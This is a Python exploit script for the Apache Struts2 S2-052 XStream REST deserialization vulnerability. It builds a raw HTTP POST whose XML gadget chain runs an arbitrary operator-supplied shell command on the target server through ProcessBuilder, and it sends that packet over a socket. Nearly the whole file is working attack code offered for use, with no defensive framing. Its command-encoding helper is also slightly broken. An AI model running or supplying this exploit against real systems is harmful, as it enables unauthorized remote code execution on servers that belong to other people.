#!/usr/bin/env python
# zc00l own apache struts2 xstream rest exploit
# ================================================
# Have fun :)
from pwn import *
from argparse import ArgumentParser
import socket

DEBUG = False
PACKET_HEADER = """POST TARGETURI HTTP/1.1
Host: IPADDRESS:PORT
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: application/xml
Content-Length: CONTENT_LENGTH_BYTES
Connection: close

"""
PAYLOAD = """<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>/bin/sh</string><string>-c</string><string>zc00l</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>p4WVJLW2H</name>
                  </filter>
                  <next class="string">6Fcg22xLlaHiIK8</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>
"""

def adjust_command(command):
    """
    Adjust the payload to avoid any errors.
    """
    tmp_command = str()
    if "&" in command:
        tmp_command = "echo " 
        tmp_command += command.encode("base64")
        tmp_command += "|base64 -d|bash"

    command = tmp_command.replace("\n", "")
    if DEBUG is True:
        print hexdump(command)
        print("Final command: {0}".format(command))
    return command

def adjust_payload(uri, ipaddress, port, command):
    """
    Adjust payload with the supplied command from operator.
    """
    header = PACKET_HEADER.replace("IPADDRESS", ipaddress)
    header = header.replace("PORT", str(port))
    header = header.replace("TARGETURI", uri)
    payload = PAYLOAD.replace("zc00l", command)
    
    # Count bytes from final payload and set it to header
    content_length = len(payload)
    header = header.replace("CONTENT_LENGTH_BYTES", str(content_length))

    # Craft the final HTTP post payload
    exploit_pkt = header + payload
    return exploit_pkt

def send_exploit(ip, port, payload):
    """
    Send the exploit packet to the remote server.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
        sock.send(payload)
    except Exception as e:
        error("Exploit failed: {0}".format(e))
    return 0

def parse_target(target):
    """"
    Function to parse a "http://ipaddress:port/orders/N" input
    and get the information to be usable by the exploit script.
    """
    try:
        data = target.rsplit('/')
        ip = data[2]  # this gets the IP address from http://IP
        if ":" not in ip:
            port = 80
        else:
            port = ip.split(":")[1]
        ind = data.index(ip) + 1
        uri = '/' + '/'.join(data[ind:])
    except Exception as e:
        error("Error parsing target information: {0}".format(e))
    info("Target information: ")
    print("\tIP .....: {0}".format(ip))
    print("\tPort ...: {0}".format(port))
    print("\tURI ....: {0}".format(uri))
    return ip, port, uri

def main():
    info("Apache Struts XStream REST vulnerability - S2-052")
    parser = ArgumentParser()
    parser.add_argument("--target", required=True, type=str, help="Exploit URL, like http://website.com/orders/1")
    parser.add_argument("--command", required=True, type=str, help="Command to be executed")
    args = parser.parse_args()

    command = args.command
    command = adjust_command(command)
    ip, port, uri = parse_target(args.target)

    info("Creating payload ...")
    exploit_pkt = adjust_payload(uri, ip, port, args.command)
    info("Exploit packet has {0} bytes.".format(len(exploit_pkt)))

    if DEBUG is True:
        print hexdump(exploit_pkt)

    info("Sending exploit packet ...")
    send_exploit(ip, port, exploit_pkt)
    success("Exploit packet has been sent.")
    return 0


if __name__ == "__main__":
    main()

